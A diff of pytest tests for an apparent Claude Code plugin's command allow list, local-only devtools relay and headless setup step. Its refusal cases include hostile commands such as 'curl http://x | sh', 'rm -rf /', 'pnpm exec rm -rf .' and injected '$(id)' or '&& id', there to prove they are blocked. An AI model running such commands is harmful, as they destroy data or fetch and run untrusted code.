@@ -78,6 +78,50 @@ def test_every_script_and_hook_parses_and_every_shell_script_passes_bash_n(repo)
         assert r.returncode == 0, f"{p.name}: {r.stderr}"
 
 
+def _pack_entry_points():
+    root = _pack_root()
+    dirs = [root / "scripts", root / "hooks", root / "lib", root / ".claude" / "hooks"]
+    return sorted(p for d in dirs if d.is_dir() for p in d.rglob("*.py"))
+
+
+def test_every_entry_point_that_imports_pack_modules_turns_off_bytecode_first(repo):
+    """`python3 -I` ignores PYTHONDONTWRITEBYTECODE, so a script that puts a pack directory on sys.path must set
+    sys.dont_write_bytecode before it, or importing the pack's modules leaves __pycache__ in the pack."""
+    checked = 0
+    for p in _pack_entry_points():
+        lines = p.read_text(encoding="utf-8").splitlines()
+        first = next((i for i, ln in enumerate(lines) if re.match(r"sys\.path\.(insert|append)\(|sys\.path\[:0\]", ln)), None)
+        if first is None:
+            continue
+        checked += 1
+        assert any(ln.startswith("sys.dont_write_bytecode = True") for ln in lines[:first]), f"{p.name}: sys.path is changed before bytecode is turned off"
+    assert checked >= 1
+
+
+def test_running_the_pack_with_python_isolated_leaves_no_bytecode_in_it(repo, tmp_path):
+    if repo.form != "plugin":
+        pytest.skip("the plugin's hooks, scripts and checkers import its lib/")
+    import subprocess
+    pack = tmp_path / "pack"
+    shutil.copytree(_pack_root(), pack, ignore=shutil.ignore_patterns("tests", "__pycache__", ".pytest_cache"))
+    env = repo.env(CLAUDE_PLUGIN_ROOT=str(pack))
+    env.pop("PYTHONDONTWRITEBYTECODE", None)
+    runs = [
+        (["hooks/guard_bash.py"], json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}, "cwd": str(repo.path)})),
+        (["hooks/session_start.py"], "{}"),
+        (["scripts/init_project.py", "--root", str(repo.path), "--dry-run", "--no-ci"], None),
+        (["scripts/ratchet.py", "--root", str(repo.path)], None),
+        (["scripts/checkers/python/module_state.py", "--root", str(repo.path), "--config", str(repo.path / ".claude" / "sdlc.json")], None),
+        (["lib/frontend_foldkit.py", "--help"], None),
+    ]
+    for args, stdin in runs:
+        p = subprocess.run([sys.executable, "-I", str(pack / args[0]), *args[1:]], input=stdin, capture_output=True, text=True,
+                           cwd=repo.path, env=env, timeout=180)
+        assert "Traceback" not in p.stderr, (args[0], p.stderr)
+    left = sorted(str(p.relative_to(pack)) for p in pack.rglob("__pycache__"))
+    assert left == [], left
+
+
 def test_new_scripts_state_what_they_check_and_why(repo):
     """Every new script opens with a docstring that says why and cites the REC id it implements."""
     names = ["acceptance.py", "freeze_tests.py", "check_agent_config.py", "check_claude_md_paths.py", "check_pr_size.py",
@@ -219,7 +263,7 @@ def test_acceptance_refuses_commands_outside_the_allow_list(repo):
     )
     r = _acceptance(repo, body)
     assert r.rc == 1 and "ACCEPTANCE passed=1 failed=4" in r.out, r.text  # the echo runs, but without a shell
-    assert r.out.count("command not allowed") == 3
+    assert sum("command not allowed" in ln for ln in r.out.splitlines() if ln.endswith(("  PASS", "  FAIL"))) == 3  # table rows; a cut row is repeated below
     assert not repo.exists("outside_scope.txt") and not repo.exists("pwned.txt") and not repo.exists("got.txt")
     assert repo.git("log", "--oneline").count("\n") == 1  # no commit was made
     assert "acceptance: $ git commit" in r.out  # every command is printed before it runs
@@ -3261,7 +3305,7 @@ def test_acceptance_runs_the_inner_command_of_a_runner_form(repo, tmp_path):
     repo.write(".claude/work/rl/contract.md", "# c\n\n## Acceptance\n- $ uv run --no-sync pytest tests -q\n  => contains \"uv-stub:run --no-sync pytest tests -q\"\n- $ uv run git push\n  => exit 0\n")
     r = repo.run_script("acceptance.py", "--root", str(repo.path), env=env)
     assert r.rc == 1 and "ACCEPTANCE passed=1 failed=1" in r.out, r.text
-    assert r.out.count("command not allowed") == 1
+    assert sum("command not allowed" in ln for ln in r.out.splitlines() if ln.endswith(("  PASS", "  FAIL"))) == 1  # table rows; a cut row is repeated below
 
 
 def test_acceptance_usage_and_docstring_list_the_runner_forms(repo):
@@ -3288,9 +3332,12 @@ def _py_project(root, lock: str | None = None, pyproject: str = "[project]\nname
     (None, "[project]\nname='x'\n", "", "python3 -m"),
     ("uv.lock", "[tool.poetry]\nname='x'\n", "uv", "uv run"),  # uv wins over poetry
 ])
-def test_init_detects_the_python_runner_and_writes_one_spelling_everywhere(repo, tmp_path, capsys, lock, pyproject, runner, prefix):
+def test_init_detects_the_python_runner_and_writes_one_spelling_everywhere(repo, tmp_path, capsys, monkeypatch, lock, pyproject, runner, prefix):
     if repo.form != "plugin":
         pytest.skip("init_project.py is the plugin's installer")
+    # A laptop init: under CI=1 a missing runner tool (uv, poetry, pdm on a bare runner) is refused by design.
+    monkeypatch.delenv("CI", raising=False)
+    monkeypatch.delenv("GITHUB_ACTIONS", raising=False)
     mod = _import_init()
     proj = _py_project(tmp_path / "p", lock, pyproject)
     assert mod.detect_python_runner(str(proj))[0] == runner
@@ -3354,4 +3401,512 @@ def test_a_uv_project_passes_the_skill_permission_check(repo, tmp_path):
     if repo.form != "plugin":
         pytest.skip("plugin templates only")
     r = repo.run_script("check_skill_permissions.py", "--root", str(_pack_root()), "--set", "test_command=uv run pytest")
+    assert r.rc == 0 and "0 uncovered" in r.out, r.text
+
+
+# ---------------------------------------------------------------------------------------------
+# Node acceptance forms, the DevTools line kind and the headless setup command
+# ---------------------------------------------------------------------------------------------
+
+NODE_ALLOWED = [
+    "pnpm test",
+    "pnpm test --run tests/unit",
+    "pnpm exec vitest run",
+    "pnpm exec vitest run src/a.test.ts -t name",
+    "pnpm vitest run --reporter=dot",
+    "pnpm exec playwright test tests/e2e/home.spec.ts",
+    "pnpm lint",
+    "pnpm typecheck",
+    "npm test",
+    "npm test --silent",
+    "npm run test",
+    "npm run test -- --run",
+    "npx vitest run",
+    "npx --no-install vitest run src",
+    "yarn test",
+    "yarn vitest run",
+    "bun test",
+    "bun test tests/a.test.ts",
+    "bunx vitest run",
+]
+NODE_REFUSED = [
+    "pnpm test && rm -rf node_modules",
+    "pnpm test; id",
+    "pnpm test | tee out.txt",
+    "pnpm test > out.txt",
+    "pnpm test 2>&1",
+    "pnpm test $(id)",
+    "pnpm test `id`",
+    "pnpm exec vitest run -u",
+    "pnpm exec vitest run --update",
+    "pnpm exec playwright test --update-snapshots",
+    "pnpm exec vitest run --config /tmp/x.mjs",
+    "pnpm exec vitest run --outputFile=out.json",
+    "pnpm lint --fix",
+    "pnpm typecheck --watch",
+    "pnpm install",
+    "pnpm add evilpkg",
+    "pnpm run test",
+    "pnpm exec rm -rf .",
+    "pnpm exec vitest",
+    "pnpm --dir /tmp test",
+    "pnpm -C /tmp test",
+    "pnpm dlx evilpkg",
+    "pnpm *",
+    "npm install",
+    "npm ci",
+    "npm run build",
+    "npm run lint",
+    "npm exec evil",
+    "npx evilpkg",
+    "npx vitest",
+    "npx --yes vitest run",
+    "npx eslint .",
+    "yarn add evilpkg",
+    "yarn install",
+    "yarn run build",
+    "bun install",
+    "bun run build",
+    "bun x evil",
+    "bunx evilpkg",
+    "bunx vitest",
+]
+
+
+@pytest.mark.parametrize("cmd", NODE_ALLOWED)
+def test_acceptance_allows_the_node_forms(repo, cmd):
+    argv, why = _import_acceptance(repo).allowed(cmd, str(repo.path))
+    assert argv == cmd.split() and why == "", why
+
+
+@pytest.mark.parametrize("cmd", NODE_REFUSED)
+def test_acceptance_refuses_every_other_node_form_and_any_shell_operator(repo, cmd):
+    argv, why = _import_acceptance(repo).allowed(cmd, str(repo.path))
+    assert argv is None and why, cmd
+
+
+def test_acceptance_runs_a_node_line_without_a_shell(repo, tmp_path):
+    """A stand-in `pnpm` proves argv goes straight through; `pnpm test && x` never reaches it."""
+    bin_dir = tmp_path / "bin"
+    bin_dir.mkdir()
+    stub = bin_dir / "pnpm"
+    stub.write_text("#!/bin/sh\necho \"pnpm-stub:$*\"\n")
+    stub.chmod(0o755)
+    env = repo.env()
+    env["PATH"] = bin_dir.as_posix() + ":" + env.get("PATH", "")
+    repo.contract()
+    repo.write(".claude/work/rl/contract.md", "# c\n\n## Acceptance\n- $ pnpm test\n  => exit 0\n- $ pnpm typecheck\n  => contains \"pnpm-stub:typecheck\"\n"
+               "- $ pnpm test && echo pwned\n  => exit 0\n")
+    r = repo.run_script("acceptance.py", "--root", str(repo.path), env=env)
+    assert r.rc == 1 and "ACCEPTANCE passed=2 failed=1" in r.out, r.text
+    assert "pwned" not in r.out.replace("pnpm test && echo pwned", "")
+
+
+def test_acceptance_help_and_refusal_name_the_node_forms(repo):
+    r = repo.run_script("acceptance.py", "--help")
+    flat = " ".join(r.out.split())  # argparse wraps the description
+    for form in ("pnpm test", "pnpm exec vitest run", "pnpm exec playwright test", "npx", "yarn test", "bun test", "bunx vitest run", "FOLDKIT_DEVTOOLS_URL"):
+        assert form in flat, form
+    _argv, why = _import_acceptance(repo).allowed("pnpm install", str(repo.path))
+    assert "pnpm test" in why and "bunx vitest run" in why
+
+
+FAKE_RELAY = '''\
+import json, os, sys
+LOG = os.environ.get("FAKE_RELAY_LOG")
+model = {"counter": 0, "items": [10, 20], "env": {"host": os.environ.get("FOLDKIT_DEVTOOLS_MCP_HOST"), "port": os.environ.get("FOLDKIT_DEVTOOLS_MCP_PORT")}}
+def reply(i, result):
+    print(json.dumps({"jsonrpc": "2.0", "id": i, "result": result}), flush=True)
+def text(value, error=False):
+    out = {"content": [{"type": "text", "text": value if isinstance(value, str) else json.dumps(value, indent=2)}]}
+    if error:
+        out["isError"] = True
+    return out
+print("not json noise on stdout", flush=True)
+for line in sys.stdin:
+    msg = json.loads(line)
+    if LOG:
+        open(LOG, "a").write(json.dumps(msg) + "\\n")
+    if "id" not in msg:
+        continue
+    if msg["method"] == "initialize":
+        reply(msg["id"], {"protocolVersion": "2025-03-26", "capabilities": {"tools": {}}, "serverInfo": {"name": "fake", "version": "0"}})
+    elif msg["method"] == "tools/call":
+        name, args = msg["params"]["name"], msg["params"]["arguments"]
+        if name == "foldkit_dispatch_messages":
+            msgs = args["messages"]
+            if any(m.get("_tag") == "Bad" for m in msgs):
+                reply(msg["id"], text("Error: message 0 does not match the Message Schema", True))
+                continue
+            for m in msgs:
+                if m.get("_tag") == "Increment":
+                    model["counter"] += m.get("by", 1)
+            reply(msg["id"], text({"_tag": "ResponseDispatched", "acceptedAtIndices": list(range(len(msgs)))}))
+        elif name == "foldkit_get_model":
+            node = model
+            try:
+                for seg in args["path"].split(".")[1:]:
+                    node = node[int(seg)] if isinstance(node, list) else node[seg]
+            except (KeyError, IndexError, ValueError):
+                reply(msg["id"], text("Error: path does not resolve", True))
+                continue
+            reply(msg["id"], text({"value": node, "atPath": args["path"], "summarized": False}))
+        else:
+            reply(msg["id"], text("Error: unknown tool", True))
+'''
+
+
+def _devtools_run(repo, tmp_path, acceptance: str, url: str | None = "http://localhost:9988", relay: bool = True):
+    relay_py = tmp_path / "fake_relay.py"
+    relay_py.write_text(FAKE_RELAY)
+    env = repo.env()
+    for k in ("FOLDKIT_DEVTOOLS_URL", "FOLDKIT_DEVTOOLS_MCP_CMD"):
+        env.pop(k, None)
+    if url is not None:
+        env["FOLDKIT_DEVTOOLS_URL"] = url
+    env["FOLDKIT_DEVTOOLS_MCP_CMD"] = f"{sys.executable} -I {relay_py}"
+    env["FAKE_RELAY_LOG"] = str(tmp_path / "relay.log")
+    repo.contract()
+    repo.write(".claude/work/rl/contract.md", "# c\n\n## Acceptance\n" + acceptance)
+    return repo.run_script("acceptance.py", "--root", str(repo.path), env=env), tmp_path / "relay.log"
+
+
+def test_acceptance_parses_a_devtools_line_as_an_item(repo):
+    mod = _import_acceptance(repo)
+    got = mod.parse("## Acceptance\n- mcp: foldkit_dispatch_messages [{\"_tag\":\"Increment\"}]\n  => model.counter == 1\n- $ pnpm test\n  => exit 0\n")
+    assert got == [('mcp: foldkit_dispatch_messages [{"_tag":"Increment"}]', "model.counter == 1"), ("pnpm test", "exit 0")]
+
+
+def test_acceptance_devtools_line_passes_when_the_model_path_matches(repo, tmp_path):
+    r, log = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Increment"},{"_tag":"Increment","by":2}]\n  => model.counter == 3\n'
+                           '- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => model.items.1 == 20\n'
+                           '- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => model.counter != 99\n')
+    assert r.rc == 0 and "ACCEPTANCE passed=3 failed=0" in r.out, r.text
+    calls = [json.loads(ln) for ln in log.read_text().splitlines()]
+    methods = [c["method"] for c in calls[:4]]
+    assert methods == ["initialize", "notifications/initialized", "tools/call", "tools/call"]
+    assert calls[2]["params"]["name"] == "foldkit_dispatch_messages" and calls[2]["params"]["arguments"] == {"messages": [{"_tag": "Increment"}, {"_tag": "Increment", "by": 2}]}
+    assert calls[3]["params"] == {"name": "foldkit_get_model", "arguments": {"path": "root.counter", "expand": True}}
+
+
+def test_acceptance_devtools_line_fails_when_the_model_differs(repo, tmp_path):
+    r, _log = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Increment"}]\n  => model.counter == 5\n'
+                            '- mcp: foldkit_dispatch_messages [{"_tag":"Increment"}]\n  => model.counter != 1\n')
+    assert r.rc == 1 and "ACCEPTANCE passed=0 failed=2" in r.out, r.text
+    assert "model.counter = 1" in r.out
+
+
+def test_acceptance_devtools_line_fails_closed_when_the_relay_is_not_configured(repo, tmp_path):
+    r, log = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Increment"}]\n  => model.counter == 1\n', url=None)
+    assert r.rc == 1 and "ACCEPTANCE passed=0 failed=1" in r.out and "devtools relay not configured" in r.out, r.text
+    assert not log.exists()  # nothing was started
+    r2, log2 = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Increment"}]\n  => model.counter == 1\n', url="  ")
+    assert r2.rc == 1 and "devtools relay not configured" in r2.out and not log2.exists()
+
+
+def test_acceptance_repeats_a_cut_row_in_full_below_the_table(repo, tmp_path):
+    r, _log = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Increment"}]\n  => model.counter == 1\n', url=None)
+    assert r.rc == 1, r.text
+    full = "got: devtools relay not configured (set FOLDKIT_DEVTOOLS_URL to the local relay, for example http://localhost:9988)"
+    assert full in r.out, r.text
+    assert 'FAIL: $ mcp: foldkit_dispatch_messages [{"_tag":"Increment"}]' in r.out and "  expected: model.counter == 1" in r.out
+    ok = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Increment"}]\n  => model.counter == 1\n')[0]
+    assert ok.rc == 0 and "  got: " not in ok.out, ok.text  # short rows are not repeated
+
+
+@pytest.mark.parametrize("url", ["http://example.com:9988", "https://relay.internal", "http://10.0.0.5:9988", "http://localhost.evil.com:9988",
+                                 "http://user:pw@localhost:9988", "ws://localhost:9988", "localhost:9988", "http://[::1]:9988", "file:///tmp/x"])
+def test_acceptance_devtools_refuses_a_relay_that_is_not_local(repo, tmp_path, url):
+    r, log = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Increment"}]\n  => model.counter == 1\n', url=url)
+    assert r.rc == 1 and "ACCEPTANCE passed=0 failed=1" in r.out, r.text
+    assert ("dev-only" in r.out or "http(s)" in r.out) and not log.exists(), r.text
+
+
+def test_acceptance_devtools_hands_the_url_host_and_port_to_the_relay(repo, tmp_path):
+    r, _ = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => model.env.port == "4321"\n'
+                         '- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => model.env.host == "127.0.0.1"\n', url="http://127.0.0.1:4321")
+    assert r.rc == 0 and "passed=2 failed=0" in r.out, r.text
+    r2, _ = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => model.env.port == "9988"\n', url="http://localhost")
+    assert r2.rc == 0, r2.text  # no port in the URL: the relay's documented default
+
+
+@pytest.mark.parametrize("line,why", [
+    ('- mcp: foldkit_get_model {}\n  => model.counter == 0\n', "only `mcp: foldkit_dispatch_messages"),
+    ('- mcp: foldkit_dispatch_messages not-json\n  => model.counter == 0\n', "not JSON"),
+    ('- mcp: foldkit_dispatch_messages []\n  => model.counter == 0\n', "1 to 100 objects"),
+    ('- mcp: foldkit_dispatch_messages ["x"]\n  => model.counter == 0\n', "1 to 100 objects"),
+    ('- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n', "no `=>` expectation"),
+    ('- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => exit 0\n', "expects `=> model."),
+    ('- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => model.counter == {bad\n', "not JSON"),
+    ('- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => model.a b == 1\n', "expects `=> model."),
+])
+def test_acceptance_devtools_malformed_lines_fail_with_a_reason(repo, tmp_path, line, why):
+    r, _ = _devtools_run(repo, tmp_path, line)
+    assert r.rc == 1 and "passed=0 failed=1" in r.out and why in r.out, r.text
+
+
+def test_acceptance_devtools_reports_a_rejected_dispatch_and_a_missing_path(repo, tmp_path):
+    r, _ = _devtools_run(repo, tmp_path, '- mcp: foldkit_dispatch_messages [{"_tag":"Bad"}]\n  => model.counter == 0\n'
+                         '- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => model.nope == 0\n')
+    assert r.rc == 1 and "passed=0 failed=2" in r.out, r.text
+    assert "dispatch refused" in r.out and "get_model failed" in r.out
+
+
+def test_acceptance_devtools_reports_a_relay_that_cannot_start(repo, tmp_path):
+    repo.contract()
+    repo.write(".claude/work/rl/contract.md", '# c\n\n## Acceptance\n- mcp: foldkit_dispatch_messages [{"_tag":"Noop"}]\n  => model.counter == 0\n')
+    env = repo.env()
+    env["FOLDKIT_DEVTOOLS_URL"] = "http://localhost:9988"
+    env["FOLDKIT_DEVTOOLS_MCP_CMD"] = str(tmp_path / "no-such-relay")
+    r = repo.run_script("acceptance.py", "--root", str(repo.path), env=env)
+    assert r.rc == 1 and "devtools relay error" in r.out, r.text
+
+
+def _cfg_rel(repo) -> str:
+    return f".claude/{'cay' + 'lent'}.json" if repo.form == "kit" else ".claude/sdlc.json"
+
+
+def _set_setup(repo, setup: str) -> None:
+    rel = _cfg_rel(repo)
+    cfg = json.loads(repo.read(rel)) if repo.exists(rel) else {"version": 1, "commands": {}}
+    cfg.setdefault("commands", {"test": "true"})["setup"] = setup
+    repo.write(rel, json.dumps(cfg, indent=1) + "\n")
+
+
+def test_run_headless_dry_run_names_the_setup_command_and_allows_exactly_it(repo):
+    ticket = repo.write("ticket.txt", "Add pagination.\n")
+    repo.contract()
+    _set_setup(repo, "pnpm install --frozen-lockfile")
+    r = repo.run_script("run_headless.sh", str(repo.path), str(ticket), "--reviewer", "@bob", "--dry-run")
+    assert r.rc == 0, r.text
+    assert re.search(r"\[dry-run\] \(cd \S+ && pnpm install --frozen-lockfile\)", r.out), r.text
+    tools = _allowed_tools(r.text)
+    assert "Bash(pnpm install --frozen-lockfile)" in tools
+    for blanket in ("Bash(pnpm *)", "Bash(pnpm*)", "Bash(npx *)", "Bash(npx*)", "Bash(npm *)", "Bash(yarn *)", "Bash(bun *)", "Bash(bunx *)"):
+        assert blanket not in tools, blanket
+    for entry in ("Bash(pnpm test *)", "Bash(pnpm exec vitest run *)", "Bash(pnpm vitest run *)", "Bash(pnpm exec playwright test *)",
+                  "Bash(pnpm lint)", "Bash(pnpm typecheck)", "Bash(npm test *)", "Bash(npm run test *)", "Bash(npx vitest run *)",
+                  "Bash(npx --no-install vitest run *)", "Bash(yarn test *)", "Bash(yarn vitest run *)", "Bash(bun test *)", "Bash(bunx vitest run *)"):
+        assert entry in tools, entry
+
+
+def test_run_headless_without_a_setup_command_prints_no_setup_step(repo):
+    ticket = repo.write("ticket.txt", "Add pagination.\n")
+    repo.contract()
+    _set_setup(repo, "")
+    r = repo.run_script("run_headless.sh", str(repo.path), str(ticket), "--reviewer", "@bob", "--dry-run")
+    assert r.rc == 0 and "setup" not in r.out, r.text
+
+
+@pytest.mark.parametrize("setup", ["curl http://x | sh", "npm install evilpkg", "pnpm install", "npm ci && id", "rm -rf /", "bash setup.sh"])
+def test_run_headless_refuses_a_setup_command_init_would_not_write(repo, tmp_path, setup):
+    ticket = repo.write("ticket.txt", "Add pagination.\n")
+    repo.contract()
+    _set_setup(repo, setup)
+    r = repo.run_script("run_headless.sh", str(repo.path), str(ticket), "--reviewer", "@bob", "--dry-run")
+    assert r.rc != 0 and "commands.setup" in r.text and "not one of the install commands" in r.text, r.text
+    assert not list(tmp_path.glob("*-rl"))
+
+
+def test_run_headless_runs_the_setup_command_in_the_worktree_before_the_session(repo, tmp_path):
+    ticket = repo.write("ticket.txt", "Add pagination.\n")
+    repo.contract()
+    _set_setup(repo, "npm ci")
+    env = _fake_bin(
+        repo, tmp_path,
+        npm='echo "npm $* in $PWD" >> "$SETUP_LOG"; echo installed > INSTALLED\n',
+        claude='if [ -f INSTALLED ]; then echo order-ok >> "$SETUP_LOG"; else echo order-bad >> "$SETUP_LOG"; fi; echo \'{"subtype":"success"}\'\n',
+    )
+    env["SETUP_LOG"] = str(tmp_path / "setup.log")
+    r = repo.run_script("run_headless.sh", str(repo.path), str(ticket), "--reviewer", "@bob", "--no-push", env=env)
+    assert r.rc == 0, r.text
+    lines = (tmp_path / "setup.log").read_text().splitlines()
+    assert lines[0].startswith("npm ci in ") and lines[0].endswith("-rl") and lines[1:] == ["order-ok"], lines
+    assert "setup: npm ci" in r.out and "setup ok" in r.out
+    assert list((repo.path / ".claude" / "work" / "headless").glob("rl-*.setup.log"))
+    assert not (repo.path / "INSTALLED").exists()  # the install ran in the worktree, not in the repo
+
+
+def test_run_headless_stops_before_the_session_when_the_setup_command_fails(repo, tmp_path):
+    ticket = repo.write("ticket.txt", "Add pagination.\n")
+    repo.contract()
+    _set_setup(repo, "npm ci")
+    env = _fake_bin(repo, tmp_path, npm='echo "boom: lockfile out of date" >&2; exit 3\n', claude='echo started >> "$SETUP_LOG"; echo \'{"subtype":"success"}\'\n')
+    env["SETUP_LOG"] = str(tmp_path / "claude.log")
+    r = repo.run_script("run_headless.sh", str(repo.path), str(ticket), "--reviewer", "@bob", "--no-push", env=env)
+    assert r.rc == 1 and "setup failed (exit 3)" in r.out and "no session started" in r.out, r.text
+    assert "setup: boom: lockfile out of date" in r.out
+    assert not (tmp_path / "claude.log").exists()
+    assert list(tmp_path.glob("*-rl"))  # the worktree is kept for inspection
+
+
+# ---------------------------------------------------------------------------------------------
+# init: Node runner detection and the setup command (plugin only)
+# ---------------------------------------------------------------------------------------------
+
+def _node_project(root, locks=(), scripts=None):
+    root.mkdir(parents=True, exist_ok=True)
+    (root / "package.json").write_text(json.dumps({"name": "fx", "version": "1.0.0", "scripts": scripts or {"test": "vitest run"}}))
+    (root / "src").mkdir(exist_ok=True)
+    (root / "src" / "index.ts").write_text("export const a = 1\n")
+    for lock in locks:
+        (root / lock).write_text("")
+    return root
+
+
+NODE_TABLE = [
+    # lock files present, runner, test, lint_fix, format, lint_report, typecheck, setup
+    (("pnpm-lock.yaml",), "pnpm", "pnpm test", "pnpm exec eslint --fix --quiet {file}",
+     "pnpm exec prettier --write --log-level silent {file}", "pnpm exec eslint -f json .", "pnpm exec tsc --noEmit --pretty false",
+     "pnpm install --frozen-lockfile"),
+    (("yarn.lock",), "yarn", "yarn test", "yarn exec eslint --fix --quiet {file}",
+     "yarn exec prettier --write --log-level silent {file}", "yarn exec eslint -f json .", "yarn exec tsc --noEmit --pretty false",
+     "yarn install --immutable"),
+    (("bun.lockb",), "bun", "bun test", "bunx eslint --fix --quiet {file}",
+     "bunx prettier --write --log-level silent {file}", "bunx eslint -f json .", "bunx tsc --noEmit --pretty false",
+     "bun install --frozen-lockfile"),
+    (("bun.lock",), "bun", "bun test", "bunx eslint --fix --quiet {file}",
+     "bunx prettier --write --log-level silent {file}", "bunx eslint -f json .", "bunx tsc --noEmit --pretty false",
+     "bun install --frozen-lockfile"),
+    (("package-lock.json",), "npm", "npm test --silent", "npx --no-install eslint --fix --quiet {file}",
+     "npx --no-install prettier --write --log-level silent {file}", "npx --no-install eslint -f json .",
+     "npx --no-install tsc --noEmit --pretty false", "npm ci"),
+    ((), "npm", "npm test --silent", "npx --no-install eslint --fix --quiet {file}",
+     "npx --no-install prettier --write --log-level silent {file}", "npx --no-install eslint -f json .",
+     "npx --no-install tsc --noEmit --pretty false", "npm ci"),
+    # precedence: pnpm, yarn, bun, npm
+    (("pnpm-lock.yaml", "yarn.lock", "bun.lockb", "package-lock.json"), "pnpm", "pnpm test", None, None, None, None, "pnpm install --frozen-lockfile"),
+    (("yarn.lock", "bun.lockb", "package-lock.json"), "yarn", "yarn test", None, None, None, None, "yarn install --immutable"),
+    (("bun.lock", "package-lock.json"), "bun", "bun test", None, None, None, None, "bun install --frozen-lockfile"),
+]
+
+
+@pytest.mark.parametrize("locks,runner,test,lint_fix,fmt,lint_report,typecheck,setup", NODE_TABLE)
+def test_init_detects_the_node_runner_and_writes_one_spelling_everywhere(repo, tmp_path, capsys, locks, runner, test, lint_fix, fmt, lint_report, typecheck, setup):
+    if repo.form != "plugin":
+        pytest.skip("init_project.py is the plugin's installer")
+    mod = _import_init()
+    proj = _node_project(tmp_path / "p", locks)
+    assert mod.detect_node_runner(str(proj))[0] == runner
+    assert mod.main(["--root", str(proj), "--stack", "node", "--no-ci", "--allow-partial-baseline"]) == 0
+    out = capsys.readouterr().out
+    cmds = json.loads((proj / ".claude" / "sdlc.json").read_text())["commands"]
+    assert cmds["test"] == test and cmds["setup"] == setup
+    for key, want in (("lint_fix", lint_fix), ("format", fmt), ("lint_report", lint_report), ("typecheck", typecheck)):
+        if want is not None:
+            assert cmds[key] == want, key
+    assert f"node runner: {runner}" in out and f"test command: {test}" in out and f"setup command: {setup}" in out
+    assert f", runner {runner}" in out
+    settings = json.loads((proj / ".claude" / "settings.json").read_text())["permissions"]["allow"]
+    assert f"Bash({test.replace(' --silent', '')} *)" in settings and f"Bash({setup})" in settings
+    assert not [r for r in settings if r in ("Bash(pnpm *)", "Bash(npx *)", "Bash(npm *)", "Bash(yarn *)", "Bash(bun *)")]
+
+
+def test_init_prefers_a_typecheck_script_and_only_a_json_lint_script(repo, tmp_path, capsys):
+    if repo.form != "plugin":
+        pytest.skip("init_project.py is the plugin's installer")
+    mod = _import_init()
+    proj = _node_project(tmp_path / "p", ("pnpm-lock.yaml",), {"test": "vitest run", "lint": "eslint", "typecheck": "tsc --noEmit"})
+    assert mod.main(["--root", str(proj), "--stack", "node", "--no-ci", "--dry-run"]) == 0
+    out = capsys.readouterr().out
+    assert "typecheck: package.json script 'typecheck' -> pnpm typecheck" in out
+    assert "lint_report: kept pnpm exec eslint -f json ." in out and "'lint' script is not assumed to emit JSON" in out
+    assert mod.main(["--root", str(proj), "--stack", "node", "--no-ci", "--allow-partial-baseline"]) == 0
+    cmds = json.loads((proj / ".claude" / "sdlc.json").read_text())["commands"]
+    assert cmds["typecheck"] == "pnpm typecheck" and cmds["lint_report"] == "pnpm exec eslint -f json ."
+    proj2 = _node_project(tmp_path / "q", ("yarn.lock",), {"test": "jest", "typecheck": "tsc", "lint:json": "eslint -f json ."})
+    assert mod.main(["--root", str(proj2), "--stack", "node", "--no-ci", "--allow-partial-baseline"]) == 0
+    cmds2 = json.loads((proj2 / ".claude" / "sdlc.json").read_text())["commands"]
+    assert cmds2["lint_report"] == "yarn lint:json" and cmds2["typecheck"] == "yarn typecheck"
+    proj3 = _node_project(tmp_path / "r", (), {"test": "jest", "typecheck": "tsc"})
+    assert mod.apply_node_runner(json.loads((_pack_root() / "stacks" / "node.json").read_text())["commands"], "npm", mod.node_scripts(str(proj3)))[0]["typecheck"] == "npm run typecheck"
+
+
+def test_init_dry_run_names_the_node_runner_and_the_setup_command(repo, tmp_path, capsys):
+    if repo.form != "plugin":
+        pytest.skip("init_project.py is the plugin's installer")
+    mod = _import_init()
+    proj = _node_project(tmp_path / "p", ("pnpm-lock.yaml",))
+    assert mod.main(["--root", str(proj), "--stack", "node", "--no-ci", "--dry-run"]) == 0
+    out = capsys.readouterr().out
+    assert "node runner: pnpm  (pnpm-lock.yaml)" in out and "test command: pnpm test" in out
+    assert "setup command: pnpm install --frozen-lockfile" in out and "dry run: nothing written" in out
+    assert not (proj / ".claude").exists()
+
+
+@pytest.mark.parametrize("stack,marker,lock,pyproject,setup", [
+    ("python", "pyproject.toml", "uv.lock", "[project]\nname='x'\n", "uv sync --frozen"),
+    ("python", "pyproject.toml", None, "[project]\nname='x'\n\n[tool.uv]\npackage = false\n", "uv sync"),
+    ("python", "pyproject.toml", "poetry.lock", "[project]\nname='x'\n", "poetry install"),
+    ("python", "pyproject.toml", "pdm.lock", "[project]\nname='x'\n", "pdm install"),
+    ("python", "pyproject.toml", None, "[project]\nname='x'\n", ""),
+    ("go", "go.mod", None, "module x\n", "go mod download"),
+    ("rust", "Cargo.toml", None, "[package]\nname='x'\n", "cargo fetch"),
+])
+def test_init_writes_the_setup_command_for_each_stack(repo, tmp_path, lock, stack, marker, pyproject, setup):
+    if repo.form != "plugin":
+        pytest.skip("init_project.py is the plugin's installer")
+    mod = _import_init()
+    proj = tmp_path / "p"
+    proj.mkdir()
+    (proj / marker).write_text(pyproject)
+    if lock:
+        (proj / lock).write_text("")
+    assert mod.detect_setup_command(str(proj), stack) == setup
+    assert setup == "" or setup in mod.SETUP_COMMANDS
+    cfg = mod.build_config(str(proj), stack, json.loads((_pack_root() / "stacks" / f"{stack}.json").read_text()), "x/y")
+    assert cfg["commands"]["setup"] == setup
+
